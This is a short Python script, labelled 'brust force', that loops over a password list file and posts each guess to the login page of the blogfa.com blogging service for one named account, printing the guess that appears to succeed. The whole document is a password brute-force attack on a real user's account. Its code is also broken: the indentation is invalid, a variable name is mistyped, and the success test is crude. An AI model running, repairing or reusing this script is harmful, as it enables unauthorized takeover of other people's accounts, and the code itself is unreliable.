#brust force
import requests

url = "http://blogfa.com/desktop/login.aspx"
arq = open('passwordlist.txt','r').readlines()
 
      for line in arq:
            password = line.strip()
            http = requests.post(url,data={'usrid':'iranpage','pass01':password,'btnSubmit':'submit'})
            content = htto.content
            
            if "blogfa" in content:
                  print(password+ "is true")
                  break
            else:
                  print(password+"is false")
                  
                  
      
